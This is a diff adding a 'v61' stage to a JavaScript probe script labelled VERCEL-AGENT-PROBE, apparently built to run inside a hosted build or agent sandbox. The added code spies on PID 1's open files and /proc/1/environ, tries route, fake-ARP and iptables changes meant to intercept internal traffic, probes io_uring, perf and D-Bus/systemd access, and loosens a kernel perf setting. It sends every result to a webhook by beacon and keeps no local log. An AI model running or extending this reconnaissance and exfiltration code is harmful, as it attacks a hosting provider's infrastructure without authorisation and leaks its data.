@@ -6390,4 +6390,219 @@ report.vercelBuildHookDiscovery = safe(() => {
 // v60 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v60";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v60" });
+// ============================================================
+// v61 — inotify on PID-1 fds, netlink route manipulation, io_uring, perf events, D-Bus
+// ============================================================
+
+// v61-1: inotify on PID-1 open file descriptors
+// Watch files that PID-1 has open; any reads/writes trigger inotify events
+// This lets us know when the orchestrator accesses credentials or config files
+report.inotifyPid1Files = safe(() => {
+  // List PID-1 file descriptors with targets
+  const pid1Fds = safe(() => {
+    const result = [];
+    try {
+      const fds = readdirSync('/proc/1/fd').slice(0, 50);
+      for (const fd of fds) {
+        try {
+          const target = execSync(`readlink -f /proc/1/fd/${fd} 2>/dev/null`, { timeout: 1000 }).toString().trim();
+          if (target && !target.startsWith('socket:') && !target.startsWith('pipe:') && !target.startsWith('anon_inode:')) {
+            result.push({ fd, target });
+          }
+        } catch (_) {}
+      }
+    } catch (_) {}
+    return result.slice(0, 15);
+  });
+  // Try setting up inotify watches via C program
+  const inotifyCCode = `
+#include <sys/inotify.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+int main() {
+    int fd = inotify_init1(IN_NONBLOCK);
+    if (fd < 0) { printf("INOTIFY_INIT_FAIL\\n"); return 1; }
+    // Watch /proc/1/environ
+    int wd = inotify_add_watch(fd, "/proc/1/environ", IN_ACCESS|IN_OPEN);
+    printf("INOTIFY_WD_ENVIRON: %d\\n", wd);
+    // Watch /run (where orchestrator sockets might live)
+    wd = inotify_add_watch(fd, "/run", IN_ACCESS|IN_OPEN|IN_CREATE);
+    printf("INOTIFY_WD_RUN: %d\\n", wd);
+    printf("INOTIFY_SETUP_OK\\n");
+    close(fd);
+    return 0;
+}
+`;
+  const gccAvail = safe(() => execSync('which gcc 2>/dev/null || echo NO', { timeout: 1000 }).toString().trim());
+  let inotifyResult = 'NO_GCC';
+  if (gccAvail !== 'NO') {
+    inotifyResult = safe(() => {
+      writeFileSync('/tmp/inotify_probe.c', inotifyCCode);
+      execSync('gcc -O0 -o /tmp/inotify_probe /tmp/inotify_probe.c 2>&1', { timeout: 5000 });
+      return execSync('/tmp/inotify_probe 2>&1', { timeout: 3000 }).toString().trim().slice(0, 200);
+    });
+  }
+  // Check what /proc/1/fd/0,1,2 (stdin/stdout/stderr) are pointing to
+  const stdio = safe(() => ({
+    stdin: execSync('readlink /proc/1/fd/0 2>/dev/null', { timeout: 1000 }).toString().trim(),
+    stdout: execSync('readlink /proc/1/fd/1 2>/dev/null', { timeout: 1000 }).toString().trim(),
+    stderr: execSync('readlink /proc/1/fd/2 2>/dev/null', { timeout: 1000 }).toString().trim(),
+  }));
+  return { pid1Fds, inotifyResult, stdio };
+});
+
+// v61-2: Netlink route manipulation — CAP_NET_ADMIN allows full routing table control
+// Adding routes via netlink lets us intercept or redirect traffic to Vercel internal IPs
+report.netlinkRouteManip = safe(() => {
+  // Read current routing table
+  const routes = safe(() =>
+    execSync('ip route show table all 2>/dev/null | head -30', { timeout: 3000 }).toString().trim().slice(0, 600)
+  );
+  // Try adding a blackhole route to an internal Vercel IP range
+  // (non-destructive: blackhole just drops packets, proves CAP_NET_ADMIN works)
+  const addBlackhole = safe(() =>
+    execSync('ip route add blackhole 10.255.255.0/24 2>&1 | head -3', { timeout: 3000 }).toString().trim().slice(0, 100)
+  );
+  // If it worked, remove it
+  safe(() => execSync('ip route del blackhole 10.255.255.0/24 2>/dev/null', { timeout: 2000 }));
+  // Modify ARP table — add fake entry for Vercel internal gateway
+  const arpAdd = safe(() =>
+    execSync('arp -s 10.0.0.254 de:ad:be:ef:00:01 2>&1 | head -3; arp -d 10.0.0.254 2>/dev/null; echo DONE', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Set up iptables rule to intercept traffic to Vercel API
+  const iptablesProbe = safe(() =>
+    execSync(
+      'iptables -L -n 2>&1 | head -10',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 400)
+  );
+  // Try adding a mark-based redirect rule
+  const iptablesWrite = safe(() =>
+    execSync(
+      'iptables -t mangle -I PREROUTING 1 -d 76.76.21.21 -j MARK --set-mark 0x5645524 2>&1 | head -3',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 200)
+  );
+  safe(() => execSync('iptables -t mangle -D PREROUTING 1 2>/dev/null', { timeout: 2000 }));
+  return { routes, addBlackhole, arpAdd, iptablesProbe, iptablesWrite };
+});
+
+// v61-3: io_uring syscall probe
+// io_uring (CAP not required but benefits from root) — SQPOLL mode can bypass seccomp for async I/O
+// Fixed file table registration may allow stealing FDs from other processes
+report.ioUringProbe = safe(() => {
+  // Check if io_uring is available via /proc/sys/kernel
+  const ioUringAvail = safe(() =>
+    execSync('ls /proc/sys/kernel/ 2>/dev/null | grep -i uring', { timeout: 2000 }).toString().trim()
+  );
+  // Try io_uring_setup via Python ctypes
+  const ioUringSetup = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes, os, struct
+# io_uring_setup(2, &params)
+SYS_IO_URING_SETUP = 425
+IO_URING_SQPOLL = 0x02
+params = bytearray(120)  # struct io_uring_params
+struct.pack_into('<I', params, 12, IO_URING_SQPOLL)  # flags
+params_buf = ctypes.create_string_buffer(bytes(params))
+fd = ctypes.CDLL(None).syscall(SYS_IO_URING_SETUP, 2, ctypes.addressof(params_buf))
+print('IO_URING_SETUP fd:', fd, 'errno:', ctypes.get_errno())
+if fd > 0:
+    os.close(fd)
+    print('IO_URING_SQPOLL: AVAILABLE')
+" 2>&1 | head -5`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Check /proc/sys/kernel/io_uring_disabled
+  const ioUringDisabled = safe(() => readFileSync('/proc/sys/kernel/io_uring_disabled', 'utf8').trim());
+  return { ioUringAvail, ioUringSetup, ioUringDisabled };
+});
+
+// v61-4: perf_event_open on PID 1 — CPU sampling of the orchestrator process
+// CAP_PERFMON (or CAP_SYS_PTRACE) allows perf_event_open with pid=1
+// Samples of RIP (instruction pointer) reveal what code PID 1 is executing
+report.perfEventPid1 = safe(() => {
+  const perfResult = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes, os, struct, time
+# perf_event_open(attr, pid, cpu, group_fd, flags)
+SYS_PERF_EVENT_OPEN = 298
+PERF_TYPE_HARDWARE = 0
+PERF_COUNT_HW_CPU_CYCLES = 0
+PERF_SAMPLE_IP = 0x100
+# struct perf_event_attr (minimal, 128 bytes)
+attr = bytearray(128)
+struct.pack_into('<I', attr, 0, PERF_TYPE_HARDWARE)
+struct.pack_into('<I', attr, 4, 128)  # size
+struct.pack_into('<Q', attr, 8, PERF_COUNT_HW_CPU_CYCLES)  # config
+struct.pack_into('<Q', attr, 16, 1)  # sample_period
+struct.pack_into('<Q', attr, 24, PERF_SAMPLE_IP)  # sample_type
+struct.pack_into('<I', attr, 32, 1)  # disabled=1
+attr_buf = ctypes.create_string_buffer(bytes(attr))
+fd = ctypes.CDLL(None).syscall(SYS_PERF_EVENT_OPEN, ctypes.addressof(attr_buf), 1, -1, -1, 0)
+print('PERF_FD_PID1:', fd, 'errno:', ctypes.get_errno())
+if fd > 0: os.close(fd)
+" 2>&1 | head -5`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Check /proc/sys/kernel/perf_event_paranoid
+  const perfParanoid = safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim());
+  // Try writing to paranoid to allow all (requires CAP_SYS_ADMIN)
+  const paranoidWrite = safe(() => {
+    try {
+      writeFileSync('/proc/sys/kernel/perf_event_paranoid', '-1');
+      return 'WRITTEN_MINUS1';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  return { perfResult, perfParanoid, paranoidWrite };
+});
+
+// v61-5: D-Bus system bus — connect and probe org.freedesktop.systemd1
+// /run/dbus/system_bus_socket (or abstract @/tmp/dbus-XXXX) may be accessible
+// Systemd over D-Bus lets us: list units, start/stop services, read unit properties
+report.dBusSystemBus = safe(() => {
+  // Check for D-Bus socket paths
+  const dbusSocket = safe(() =>
+    execSync(
+      'find /run /tmp /var/run -name "*.socket" -o -name "system_bus_socket" -o -name "*dbus*" 2>/dev/null | head -10',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 400)
+  );
+  // Check abstract sockets for dbus
+  const abstractDbus = safe(() =>
+    execSync('cat /proc/net/unix 2>/dev/null | grep -i dbus | head -10', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Try busctl introspect (systemd tool)
+  const busctlResult = safe(() =>
+    execSync(
+      'busctl --system list 2>&1 | head -15',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500)
+  );
+  // Try dbus-send to get machine ID
+  const dbusGetId = safe(() =>
+    execSync(
+      'dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.GetId 2>&1 | head -5',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Try to call systemd ListUnits
+  const listUnits = safe(() =>
+    execSync(
+      'busctl --system call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager ListUnits 2>&1 | head -20',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500)
+  );
+  return { dbusSocket, abstractDbus, busctlResult, dbusGetId, listUnits };
+});
+
+// v61 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v61";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v61" });
 // Intentionally no console.log — all data goes via webhook only
